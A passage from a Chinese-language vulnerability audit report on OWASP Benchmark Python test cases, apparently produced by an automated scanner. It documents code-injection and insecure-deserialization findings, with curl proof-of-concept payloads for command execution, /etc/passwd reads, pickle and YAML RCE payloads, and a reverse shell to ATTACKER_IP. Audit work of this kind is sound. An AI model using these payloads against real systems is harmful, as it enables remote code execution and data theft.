+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00160.py:49` (函数 `BenchmarkTest00160_post`)
+  · source：`testcode/BenchmarkTest00160.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00160.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00160.py:40` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00160.py:49` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00160_post@testcode/BenchmarkTest00160.py:28
+
+**④ 验证**：静态判定 `confirmed` — 完整的 Python 代码注入漏洞已在沙箱中通过三次独立 payload 实弹复现：① `os.system('id')` 执行成功（空响应=无异常）；② `os.system('touch /tmp/pwned_by_benchmark')` 创建文件经 `ls` 确认存在；③ `os.popen('cat /etc/passwd').read()` 写入 `/tmp/exfil`，文件内容为完整的 `/etc/passwd`。数据流清晰：request.form.get() → bar (case 'A'始终匹配) → exec(bar)，无任何净化。
+  · 动态：✅ 已复现 — 【动态复现证据链】
+1. `os.system('touch /tmp/pwned_by_benchmark')` → `ls -la /tmp/pwned_by_benchmark` 确认文件存在（exit_code=0）
+2. `os.popen('cat /etc/passwd').read()` 写入 `/tmp/exfil` → `cat /tmp/exfil` 输出完整 `/etc/passwd`（含 root, daemon 等全部用户）
+3. 所有 payload 均返回 200，Content-Length: 0（无"Error executing statement"），证明 `exec()` 执行成功无异常
+
+【代码证据】
+- line 31: `param = request.form.get("BenchmarkTest00160")` — 不可信输入源
+- line 36: `guess = possible[0]` 恒为 `'A'`
+- line 39-40: `case 'A': bar = param` — 用户输入直接赋给 bar
+- line 49: `exec(bar)` — 危险汇聚点，无任何净化
+
+**PoC**：
+```
+# 基础 RCE（无回显，通过副作用确认）
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
+  -d 'BenchmarkTest00160=__import__("os").system("id > /tmp/cmd_out")'
+
+# 文件写入（可写任意内容到文件）
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
+  -d 'BenchmarkTest00160=open("/tmp/evil","w").write("pwned")'
+
+# 文件读取（外带到可读路径）
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
+  -d 'BenchmarkTest00160=open("/tmp/exfil","w").write(__import__("os").popen("cat /etc/passwd").read())'
+
+# 反向 Shell 命令
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00160' \
+  -d 'BenchmarkTest00160=__import__("os").system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"")'
+```
+
+**修复建议**：1. **绝对不要将用户输入传入 `exec()`**。`exec()` 执行任意 Python 代码，没有任何安全使用方式。
+2. 如果本测试用例意在模拟某种动态代码执行，应用白名单模式：预定义一组允许执行的表达式/函数名，用户仅能通过索引/枚举选择。
+3. 考虑使用 `ast.literal_eval()` 替代 `exec()` 处理简单数据类型（字符串/数字/列表/字典），它只解析字面量不执行代码。
+4. 实施输入验证：拒绝包含 `__import__`、`exec`、`eval`、`os.`、`subprocess`、`open(` 等危险模式的输入。
+
+### 2.12 Code Injection / Unsafe Eval — testcode/BenchmarkTest00161.py:40
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00161.py:40` (函数 `BenchmarkTest00161_post`)
+  · source：`testcode/BenchmarkTest00161.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00161.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00161.py:35` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00161.py:40` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00161_post@testcode/BenchmarkTest00161.py:28
+
+**④ 验证**：静态判定 `confirmed` — 该漏洞为 CWE-94 Code Injection。代码（BenchmarkTest00161.py 第31-40行）清晰地将 POST 表单参数 `BenchmarkTest00161` 不经任何净化直接传入 `exec()`。三元条件 `(7*42) - 106 > 200` 恒为假（188≯200），故用户输入始终进入 else 分支赋给 `bar`。已通过以下步骤实弹复现：（1）发送 POST 请求携带 payload `__import__('os').system('id > /tmp/pwned.txt')`，（2）容器内执行 `cat /tmp/pwned.txt` 返回 `uid=0(root)`，（3）进一步执行 `cat /etc/passwd > /tmp/passwd_out.txt` 成功读取系统密码文件。无鉴权、无净化、无限制，实现完全远程代码执行（RCE）。
+  · 动态：✅ 已复现 — 1. 代码审计：第31行 `param = request.form.get("BenchmarkTest00161")` 获取用户输入 → 第37行三元条件恒走 else 分支 → 第40行 `exec(bar)` 执行用户输入。
+2. 动态复现：POST 请求携带 `BenchmarkTest00161=__import__('os').system('id > /tmp/pwned.txt')` → 容器内 `/tmp/pwned.txt` 内容为 `uid=0(root) gid=0(root) groups=0(root)`。
+3. 进一步确认：`cat /etc/passwd > /tmp/passwd_out.txt` 成功，读取到完整系统密码文件。
+
+**PoC**：
+```
+# 复现代码注入 - 执行任意OS命令
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00161' \
+  -d 'BenchmarkTest00161=__import__('\''os'\'').system('\''id'\'')'
+
+# 或输出写入文件以绕过无回显限制
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00161' \
+  -d 'BenchmarkTest00161=__import__('\''os'\'').system('\''cat /etc/passwd > /tmp/out.txt'\'')'
+
+# 任意 Python 代码执行（非仅命令）
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00161' \
+  -d 'BenchmarkTest00161=open("/tmp/evil.txt","w").write("pwned")'
+```
+
+**修复建议**：绝对不要将用户输入直接或间接传入 `exec()`、`eval()`、`compile()` 等动态代码执行函数。修复方案：
+1. 彻底移除 `exec()` 调用，改用安全的替代逻辑；
+2. 如果必须动态执行，应使用白名单验证——仅允许预定义的有限指令集；
+3. 不可能通过输入净化来安全地使用 `exec()`——任何用户可控数据进入 `exec()` 都构成 RCE 风险。
+
+### 2.13 Code Injection / Unsafe Eval — testcode/BenchmarkTest00342.py:49
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00342.py:49` (函数 `BenchmarkTest00342_post`)
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00342.py:49` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00342_post@testcode/BenchmarkTest00342.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码审计与动态复现均确认。用户通过 POST 表单参数 'BenchmarkTest00342' 传入任意字符串，经过 ConfigParser 写入/读取（无任何净化或转义），直接传入 eval() 执行。代码中唯一的 try/except 捕获的是 eval 结果类型不匹配的 TypeError（当 eval 返回非字符串时），但任意 Python 代码执行本身完全成功。
+  · 动态：✅ 已复现 — 1. 代码审计：testcode/BenchmarkTest00342.py:34 从表单获取用户输入 → 第44行写入 ConfigParser → 第45行读取 → 第49行 eval(bar) 直接执行
+2. 动态复现：发送 POST BenchmarkTest00342="pwned" 响应返回 "pwned"（无错误）
+3. 命令执行：发送 POST BenchmarkTest00342=__import__("os").popen("id").read() 响应返回 "uid=0(root) gid=0(root) groups=0(root)"
+4. 文件读取：发送 POST BenchmarkTest00342=__import__("os").popen("cat /etc/passwd | head -5").read() 成功读取系统密码文件
+
+**PoC**：
+```
+# 1. 基础验证 - 返回字符串 'pwned'
+curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
+  -d 'BenchmarkTest00342="pwned"'
+
+# 2. 命令执行 - 运行 id
+curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
+  -d 'BenchmarkTest00342=__import__("os").popen("id").read()'
+
+# 3. 文件读取 - 读 /etc/passwd
+curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
+  -d 'BenchmarkTest00342=__import__("os").popen("cat /etc/passwd").read()'
+
+# 4. 反向 shell 或任意命令
+curl -X POST 'http://127.0.0.1:8443/benchmark/codeinj-00/BenchmarkTest00342' \
+  -d 'BenchmarkTest00342=__import__("os").popen("whoami").read()'
+```
+
+**修复建议**：永远不要将用户输入直接或间接传递给 eval()。正确的修复方案：
+1. 完全移除 eval 调用，使用安全的替代逻辑。
+2. 如果必须动态求值，使用白名单机制只允许预定义的表达式/函数。
+3. 对任何用户输入进行严格的输入验证和净化（白名单模式）。
+4. OWASP Benchmark 是测试用例，生产代码中不应出现 eval() 与用户输入的组合。
+
+### 2.14 Code Injection / Unsafe Eval — testcode/BenchmarkTest00343.py:45
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00343.py:45` (函数 `BenchmarkTest00343_post`)
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00343.py:45` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00343_post@testcode/BenchmarkTest00343.py:28
+
+**④ 验证**：静态判定 `confirmed` — 用户可控的 form 参数 BenchmarkTest00343 经过 ThingFactory 工厂创建的 Thing2.doSomething()（仅返回原值，无任何净化）后，直接传入 eval() 执行。通过 POST 请求成功注入 Python 代码，执行了系统命令（id、cat /etc/passwd），获得完整远程代码执行能力。
+  · 动态：✅ 已复现 — 1. 代码证据：testcode/BenchmarkTest00343.py:45 处 eval(bar)，bar 来自用户输入的 form 参数且无净化。
+2. 运行时证据：POST /benchmark/codeinj-00/BenchmarkTest00343 发送 "BenchmarkTest00343=__import__('os').popen('id').read()" 返回 "uid=0(root) gid=0(root) groups=0(root)"。
+3. 运行时证据：发送 "BenchmarkTest00343=__import__('os').popen('cat /etc/passwd').read()" 返回完整的 /etc/passwd 文件内容。
+
+**PoC**：
+```
+# 基础代码注入 - 执行算术运算
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00343' \
+  -d 'BenchmarkTest00343=str(1+1)'
+# 响应: 2
+
+# 远程命令执行 - 读取 /etc/passwd
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00343' \
+  -d "BenchmarkTest00343=__import__('os').popen('cat /etc/passwd').read()"
+# 响应: /etc/passwd 文件内容
+
+# 远程命令执行 - 查看当前用户
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00343' \
+  -d "BenchmarkTest00343=__import__('os').popen('id').read()"
+# 响应: uid=0(root) gid=0(root) groups=0(root)
+```
+
+**修复建议**：绝对不要将用户可控输入直接或间接传递给 eval()。改用安全替代方案：如需要动态计算数值用 int()/float() 转换；需要动态执行函数用映射表（dict）查找；需要动态评估表达式使用受限沙箱（如 ast.literal_eval()）。在本例中，若需对用户输入做某种处理，应使用预先定义的白名单操作集合。
+
+### 2.15 Code Injection / Unsafe Eval — testcode/BenchmarkTest00422.py:44
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00422.py:44` (函数 `BenchmarkTest00422_post`)
+  · source：`testcode/BenchmarkTest00422.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00422.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00422.py:38` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00422.py:44` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00422_post@testcode/BenchmarkTest00422.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码审计确认：用户通过 POST 表单提交的字段名（经过 Thing2.doSomething 原样返回）直接被传入 eval() 执行，无任何净化。动态复现已证实可通过 eval('__import__("os").popen("id").read()') 执行任意系统命令，并成功读取 /etc/passwd 文件。漏洞清晰且无争议。
+  · 动态：✅ 已复现 — 1) 代码证据：testcode/BenchmarkTest00422.py:44 行直接 eval(bar)，bar 来自用户提交的表单字段名，经由 Thing2.doSomething() 原样返回（仅拼接空字符串，无任何净化）。
+2) 动态复现证据：
+   - POST '__import__("os").popen("id").read()=BenchmarkTest00422' → 响应 "uid=0(root) gid=0(root) groups=0(root)"
+   - POST '__import__("os").popen("cat /etc/passwd | head -5").read()=BenchmarkTest00422' → 成功读取 /etc/passwd 前5行
+3) 无需任何鉴权，匿名即可利用（该项目无鉴权体系）。
+
+**PoC**：
+```
+# 执行任意系统命令
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00422' \
+  -d '__import__("os").popen("id").read()=BenchmarkTest00422'
+
+# 读取任意文件
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00422' \
+  -d '__import__("os").popen("cat /etc/passwd").read()=BenchmarkTest00422'
+
+# 写文件/反弹shell等均可通过 Python 表达式链实现
+# payload 结构：<任意 Python 表达式返回 str>=BenchmarkTest00422
+# 注意：表单键名即为传入 eval() 的表达式，表单键值需包含 "BenchmarkTest00422" 子串
+```
+
+**修复建议**：永远不要将用户可控的输入传入 eval()/exec() 等动态执行函数。应重构代码逻辑，使用安全替代方案（如字典映射、预定义操作类）。若必须动态计算表达式，应使用白名单机制严格限定可执行的表达式范围，并对输入做严格的语法/语义过滤。
+
+### 2.16 Code Injection / Unsafe Eval — testcode/BenchmarkTest00425.py:43
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00425.py:43` (函数 `BenchmarkTest00425_post`)
+  · source：`testcode/BenchmarkTest00425.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00425.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00425.py:37` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00425.py:43` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00425_post@testcode/BenchmarkTest00425.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码级分析和运行时复现双重确认。入口路由 POST /benchmark/codeinj-00/BenchmarkTest00425 无任何鉴权过滤，从 request.form 的 key 名中提取用户输入，经 'help'+param+'snapes on a plane'[4:-17] 截取还原为原始输入后，直接传入 exec() 执行任意 Python 代码。已通过 ①写入文件 /tmp/pwned_by_benchmark ②读取 /etc/passwd 写入 /tmp/read_etc_passwd 两种方式实弹验证远程代码执行成功。
+  · 动态：✅ 已复现 — 1. 成功执行 open('/tmp/pwned_by_benchmark','w').write('code_injection_successful') → 文件内容为 'code_injection_successful'（exit_code=0）
+2. 成功执行 open('/tmp/read_etc_passwd','w').write(open('/etc/passwd').read()) → 写入 839 字节的 /etc/passwd 内容
+3. 响应 200 OK，Content-Length: 0，无报错
+4. 代码路径：request.form 的 key 名 → 'help'+param+'snapes on a plane'[4:-17] → exec(bar) 完整数据流已追溯
+
+**PoC**：
+```
+# 触发任意Python代码执行（写入文件）
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00425' \
+  -d "open('/tmp/pwned','w').write('pwned')=BenchmarkTest00425"
+
+# 触发远程命令执行（通过os.system，输出不返回但命令执行）
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00425' \
+  -d "__import__('os').system('id > /tmp/out.txt')=BenchmarkTest00425"
+
+# 读取敏感文件
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00425' \
+  -d "open('/tmp/passwd','w').write(open('/etc/passwd').read())=BenchmarkTest00425"
+
+原理：表单的 key 名就是要执行的 Python 代码，value 包含 "BenchmarkTest00425" 即可通过条件判断。服务端提取 key 名后还原并传入 exec()。
+```
+
+**修复建议**：绝对不要将用户可控输入传入 exec() / eval()。对于 OWASP Benchmark 测试用例，此漏洞为预设的 benchmark 样本，不适用于实际修复。但在真实生产环境中应：1) 永远不要使用 exec/eval 处理用户输入；2) 如需动态代码执行，使用安全的沙箱机制（如 subprocess 配合白名单）；3) 对用户输入做严格的类型/格式校验。
+
+### 2.17 Insecure Deserialization — testcode/BenchmarkTest00078.py:53
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00078.py:53` (函数 `BenchmarkTest00078_post`)
+  · source：`testcode/BenchmarkTest00078.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00078.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00078.py:46` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00078.py:53` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00078_post@testcode/BenchmarkTest00078.py:35
+
+**④ 验证**：静态判定 `confirmed` — The vulnerability is confirmed and fully reproduced with RCE. The code at testcode/BenchmarkTest00078.py:53 calls pickle.loads() on base64-decoded user-controlled cookie input. The GET endpoint sets a benign cookie, but the POST endpoint reads the cookie value and (after removing a static 4-char prefix and 17-char suffix which effectively returns the original value) passes it to pickle.loads() without any sanitization. This allows arbitrary Python object deserialization. We successfully crafted a pickle payload via __reduce__ that executes arbitrary code — demonstrated by running 'id' command and having the output reflected in the HTTP response.
+  · 动态：✅ 已复现 — 1. Code at testcode/BenchmarkTest00078.py:53: pickle.loads(base64.urlsafe_b64decode(bar)) where 'bar' is derived from the user-controlled cookie 'BenchmarkTest00078' via simple string slicing that returns the original cookie value.
+2. HTTP response from curl shows: "shared string is uid=0(root) gid=0(root) groups=0(root)" — the output of the 'id' command executed on the server via pickle deserialization.
+3. File /tmp/benchmark_pwned.txt created with output 'uid=0(root) gid=0(root) groups=0(root)' via os.system('id > /tmp/benchmark_pwned.txt') executed through pickle.__reduce__.
+
+**PoC**：
+```
+# Step 1: Generate malicious pickle payload (any Python environment)
+python3 -c "
+import pickle, base64
+class RCE:
+    def __reduce__(self):
+        import subprocess
+        code = '''
+import helpers.utils
+import subprocess
+helpers.utils.sharedstr = subprocess.check_output(['id']).decode().strip()
+'''
+        return (exec, (code,))
+payload = pickle.dumps(RCE())
+print(base64.urlsafe_b64encode(payload).decode())
+"
+
+# Step 2: Send the POST request with the crafted cookie
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00078' \
+  -b 'BenchmarkTest00078=PAYLOAD_FROM_STEP1'
+
+# Alternative one-liner (direct RCE, writes to file):
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00078' \
+  -b 'BenchmarkTest00078=gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB0gPiAvdG1wL3B3bmVkLnR4dJSHaJRSlC4='
+```
+
+**修复建议**：Never use pickle.loads() on untrusted data. Use a safe serialization format like JSON instead. If deserialization of complex objects is required, use a safe alternative that only allows primitive types (e.g., marshmallow, pydantic for validation). In this specific case, replace pickle.loads(base64.urlsafe_b64decode(bar)) with a safe parser, or validate/strip the input to ensure it cannot contain malicious pickle opcodes.
+
+### 2.18 Insecure Deserialization — testcode/BenchmarkTest00164.py:47
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00164.py:47` (函数 `BenchmarkTest00164_post`)
+  · source：`testcode/BenchmarkTest00164.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00164.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00164.py:39` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00164.py:47` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00164_post@testcode/BenchmarkTest00164.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码分析确认：`BenchmarkTest00164_post()` 从 `request.form.get("BenchmarkTest00164")` 获取用户输入，经过字符串拼接后切片提取出用户原始输入（剥离 'help' 前缀和 'snapes on a plane' 后缀），然后直接传入 `base64.urlsafe_b64decode()` 解码后送入 `pickle.loads()` 反序列化。由于 pickle 反序列化会调用 `__reduce__` 方法执行任意命令，攻击者可实现远程代码执行。沙箱中已通过 `os.system('touch /tmp/pwned_BenchmarkTest00164')` 的 pickle payload 成功在服务器上创建文件，RCE 确认。
+  · 动态：✅ 已复现 — 1. POST 请求携带 pickle payload（`os.system('touch /tmp/pwned_BenchmarkTest00164')`）后，返回 "shared string is no pickles to be seen here"（而非 "Unpickling failed!"），表明反序列化成功。2. `ls -la /tmp/pwned_BenchmarkTest00164` 确认文件已创建（root, 0 bytes, Jul 10 18:01），证明命令已执行。3. 代码分析：第31行获取用户输入，第35-38行字符串处理仅提取用户原始输入，第47行 `pickle.loads(base64.urlsafe_b64decode(bar))` 无任何净化直接反序列化。
+
+**PoC**：
+```
+# 1. 生成恶意 pickle payload
+python3 -c "
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id > /tmp/pwned',))
+payload = pickle.dumps(RCE())
+print(base64.urlsafe_b64encode(payload).decode())
+"
+
+# 2. 发送 POST 请求触发反序列化
+curl -X POST 'http://TARGET:8443/benchmark/deserialization-00/BenchmarkTest00164' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d 'BenchmarkTest00164=<BASE64_ENCODED_PAYLOAD>'
+
+# 3. 验证命令执行结果
+# 响应若返回 "shared string is no pickles to be seen here" 表示成功
+# 若返回 "Unpickling failed!" 表示 payload 格式有误
+```
+
+**修复建议**：绝对不要使用 `pickle.loads()` 处理不受信任的用户输入。pickle 反序列化会执行任意代码，是公认的不安全设计。修复方案：1) 改用安全的序列化格式如 JSON（`json.loads()`）；2) 如需传递复杂对象，使用消息队列或白名单签名验证机制；3) 如果必须反序列化，对输入实施强签名验证（HMAC），确保只有受信来源的数据被处理。
+
+### 2.19 Insecure Deserialization — testcode/BenchmarkTest00269.py:47
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00269.py:47` (函数 `BenchmarkTest00269_post`)
+  · source：`testcode/BenchmarkTest00269.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00269.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00269.py:39` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00269.py:47` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00269_post@testcode/BenchmarkTest00269.py:28
+
+**④ 验证**：静态判定 `confirmed` — 通过白盒代码阅读 + 实弹复现双重确认。代码中 `yaml.load(bar, Loader=yaml.Loader)` 使用不安全的 yaml.Loader（等价于 unsafe_load），允许任意 Python 对象反序列化。用户输入从 `request.form.getlist()` 获取 → 经 ThingFactory 透传 → 直接送入 yaml.load。构造的 PoC 成功执行了 `id` 命令并通过响应体返回了命令输出 `uid=0(root) gid=0(root) groups=0(root)`，证实 RCE 已发生。文件 /tmp/rce_via_http 也确认被创建。
+  · 动态：✅ 已复现 — 1. 实弹 HTTP 请求至 `/benchmark/deserialization-00/BenchmarkTest00269`，POST body 为 `BenchmarkTest00269=!!python/object/apply:builtins.eval ["{\"text\": __import__(chr(111)+chr(115)).popen(chr(105)+chr(100)).read()}"]`，响应体返回 `uid=0(root) gid=0(root) groups=0(root)`（id命令输出）。
+2. 同一 PoC 类别的 `os.system` payload 创建了 `/tmp/rce_via_http` 文件（已确认存在）。
+3. 代码 `yaml.load(bar, Loader=yaml.Loader)` 第 44 行为不安全的 YAML 反序列化入口点。
+4. 用户输入流：第 31 行 `request.form.getlist()` → 第 39 行 `thing.doSomething(param)`（Thing1 直接返回输入）→ 第 44 行 `yaml.load()`。
+
+**PoC**：
+```
+```bash
+# PoC 1: 命令执行并回显输出（id命令）
+curl -s -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00269' \
+  --data-urlencode 'BenchmarkTest00269=!!python/object/apply:builtins.eval ["{\"text\": __import__(chr(111)+chr(115)).popen(chr(105)+chr(100)).read()}"]'
+
+# PoC 2: 创建文件证明RCE
+curl -s -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00269' \
+  -d 'BenchmarkTest00269=!!python/object/apply:os.system ["touch /tmp/pwned_yaml"]'
+
+# PoC 3: 读取任意文件（如 /etc/passwd）
+curl -s -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00269' \
+  --data-urlencode 'BenchmarkTest00269=!!python/object/apply:builtins.eval ["{\"text\": __import__(chr(111)+chr(115)).popen(\"cat /etc/passwd\").read()}"]'
+```
+```
+
+**修复建议**：将 `yaml.load(bar, Loader=yaml.Loader)` 替换为 `yaml.safe_load(bar)`。`yaml.Loader` 完全信任输入并可反序列化任意 Python 对象，`yaml.SafeLoader` 仅支持标准 YAML 标量/序列/映射，无法实例化任意类。如果确实需要复杂 YAML 功能，应使用 `yaml.SafeLoader` 并验证输入格式。
+
+### 2.20 Insecure Deserialization — testcode/BenchmarkTest00270.py:48
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00270.py:48` (函数 `BenchmarkTest00270_post`)
+  · source：`testcode/BenchmarkTest00270.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00270.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00270.py:39` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00270.py:48` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00270_post@testcode/BenchmarkTest00270.py:28
+
+**④ 验证**：静态判定 `confirmed` — CWE-502 Insecure Deserialization confirmed via dynamic RCE reproduction. The endpoint /benchmark/deserialization-00/BenchmarkTest00270 takes user-controlled input from POST form parameter 'BenchmarkTest00270', concatenates it with '_SafeStuff', and passes it to yaml.load(bar, Loader=yaml.Loader). Using yaml.Loader (the unsafe full loader) allows deserialization of arbitrary Python objects. The '_SafeStuff' suffix is bypassed by crafting the payload as a YAML mapping where the dangerous !!python/object/apply:os.system tag is placed as a mapping key (which gets evaluated during deserialization), and '_SafeStuff' naturally becomes the value for the 'text' key.
